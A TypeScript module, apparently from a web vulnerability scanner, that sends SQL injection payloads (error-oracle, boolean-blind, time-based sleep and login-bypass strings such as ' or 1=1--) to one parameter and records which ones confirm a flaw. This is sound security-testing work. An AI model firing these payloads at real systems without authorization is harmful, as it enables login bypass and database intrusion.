import { fetchUrl } from "../adapters/http.js";
import {normalizeBody, charSimilarity, escapeRegex} from "./normalize.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** SQL injection differential probe: syntax-error oracles (quote balancing),
 *  boolean blind (AND 1=1 vs AND 1=2), time-based (sleep, bounded),
 *  and authentication-bypass grammar. Verdicts require differential proof:
 *  error-signature, boolean divergence, or timing divergence vs controls. */

export interface SqliInput {
  readonly url: string;
  readonly method?: string;
  /** param location+name template: ?q=VALUE query default; body:{...,"q":"VALUE"} via bodyTemplate */
  readonly param: string;
  readonly in?: "query" | "body";
  readonly bodyTemplate?: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly bearer?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** authentication-bypass mode: target is a login endpoint, success = auth response */
  readonly authBypass?: boolean;
}
export interface SqliCase {
  readonly payload: string;
  readonly technique: string;
  readonly status: number;
  readonly ms: number;
  readonly len: number;
  readonly signal: string | null;
}
export interface SqliResult {
  readonly probed: number;
  readonly confirmed: { technique: string; payload: string; evidence: string }[];
  readonly leads: { technique: string; payload: string; evidence: string }[];
  readonly cases: SqliCase[];
  readonly artifacts: { path: string; bytes: number }[];
}

const ERR_SIG = /sqlITE|syntax error|unterminated|sqlite3?\.(?:OperationalError|DatabaseError)|SQLException|SQLSTATE|pg_query|mysql_fetch|ORA-\d{5}|bad SQL|near \".+?\": syntax error|Unexpected path/i;

export const probeSqli = async (input: SqliInput): Promise<SqliResult> => {
  const method = input.method ?? (input.in === "body" ? "POST" : "GET");
  const where = input.in ?? "query";
  const build = (payload: string): { url: string; body?: string } => {
    if (where === "body") {
      const tpl = input.bodyTemplate ?? "{}";
      const filled = tpl.replace(new RegExp(`("${escapeRegex(input.param)}"\\s*:\\s*")([^"]*)(")`), `$1${payload.replace(/\$/g, "$$$$")}$3`);
      return { url: input.url, body: filled };
    }
    const u = new URL(input.url);
    u.searchParams.set(input.param, payload);
    return { url: u.toString() };
  };
  const hdrs = { ...(input.bearer ? { authorization: `Bearer ${input.bearer}` } : {}), ...(input.headers ?? {}) };
  const send = async (payload: string): Promise<SqliCase> => {
    const { url, body } = build(payload);
    const t0 = Date.now();
    const r = await fetchUrl(url, { method, body, cookie: input.cookie, headers: body ? { "content-type": "application/json", ...hdrs } : hdrs, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000, maxAttempts: 1 });
    const ms = Date.now() - t0;
    return { payload, technique: "", status: r.status, ms, len: r.bytes, signal: ERR_SIG.test(r.body) ? "error-signature" : null };
  };
  const base = await send(where === "body" ? (input.bodyTemplate ? String(new RegExp(`"${escapeRegex(input.param)}"\\s*:\\s*"([^"]*)"`).exec(input.bodyTemplate)?.[1] ?? "") : "") : (new URL(input.url).searchParams.get(input.param) ?? ""));
  const cases: SqliCase[] = [{ ...base, payload: "(baseline)", technique: "baseline" }];
  const confirmed: SqliResult["confirmed"] = [];
  const leads: SqliResult["leads"] = [];
  // 1) 语法oracle: 单引号/双引号/反引号 → 错误签名
  for (const q of ["'", "\"", "`", "'\"", "\\'"]) {
    const c = { ...(await send(q)), payload: q, technique: "error-oracle" };
    cases.push(c);
    if (c.signal) leads.push({ technique: "error-oracle", payload: q, evidence: `SQL error signature in response (status ${c.status})` });
  }
  // 2) 布尔盲注: AND 1=1 vs AND 1=2 (数值上下文) / ' AND '1'='1 vs ' AND '1'='2 (字符串上下文)
  const pairBase = base.payload ? base.payload : "1";
  for (const [t, f] of [[`' AND '1'='1`, `' AND '1'='2`], [`${pairBase} AND 1=1`, `${pairBase} AND 1=2`], [`' OR '1'='1`, `' OR '1'='2`]] as [string, string][]) {
    const truthy = await send(t);
    const falsy = await send(f);
    cases.push({ ...truthy, payload: t, technique: "boolean-blind" }, { ...falsy, payload: f, technique: "boolean-blind" });
    const diverge = truthy.status !== falsy.status || Math.abs(truthy.len - falsy.len) > 0 || charSimilarity(normalizeBody(String(truthy.len)), normalizeBody(String(falsy.len))) < 1;
    if (truthy.status === base.status && truthy.status !== falsy.status && truthy.status >= 200 && truthy.status < 300) {
      confirmed.push({ technique: "boolean-blind", payload: `${t} / ${f}`, evidence: `truthy ${truthy.status}/${truthy.len}B vs falsy ${falsy.status}/${falsy.len}B — boolean context proven` });
    } else if (diverge && truthy.len !== falsy.len && Math.abs(truthy.len - falsy.len) > 2) {
      leads.push({ technique: "boolean-blind", payload: `${t} / ${f}`, evidence: `length divergence ${truthy.len}B vs ${falsy.len}B (statuses ${truthy.status}/${falsy.status})` });
    }
  }
  // 3) 时间盲注(有界): sqlite/pgsql/mysql 各一句, 3s阈值
  for (const p of ["' || (SELECT sqlite_sleep(3000)) || '", "'; SELECT pg_sleep(3)--", "' AND SLEEP(3)--", "1;WAITFOR DELAY '0:0:3'--"]) {
    const c = await send(p);
    cases.push({ ...c, payload: p, technique: "time-blind" });
    if (c.ms >= 2800) confirmed.push({ technique: "time-blind", payload: p, evidence: `${c.ms}ms response vs ${base.ms}ms baseline` });
  }
  // 4) 认证绕过模式: 目标为login时, 特征payload直接判
  if (input.authBypass === true) {
    for (const p of ["' or 1=1--", "' or true--", "' or '1'='1", "admin'--", "' UNION SELECT 1--"]) {
      const c = await send(p);
      cases.push({ ...c, payload: p, technique: "auth-bypass" });
      const authOk = c.status >= 200 && c.status < 300 && c.len !== base.len && c.len > Math.max(base.len * 0.5, 50);
      if (authOk) confirmed.push({ technique: "auth-bypass", payload: p, evidence: `authentication material returned (status ${c.status}, ${c.len}B vs baseline ${base.len}B)` });
    }
  }
  const artifacts = [
    await writeArtifact(input.outputRoot, "sqli_cases.json", JSON.stringify(cases, null, 2)),
    await writeArtifact(input.outputRoot, "sqli_findings.md", ["# SQL injection", "", `confirmed: ${confirmed.length}, leads: ${leads.length}`, "", ...confirmed.map(f => `- **CONFIRMED [${f.technique}]** \`${f.payload.slice(0, 80)}\` — ${f.evidence}`), ...leads.map(f => `- lead [${f.technique}] \`${f.payload.slice(0, 80)}\` — ${f.evidence}`)].join("\n")),
  ];
  return { probed: cases.length, confirmed, leads, cases, artifacts };
};
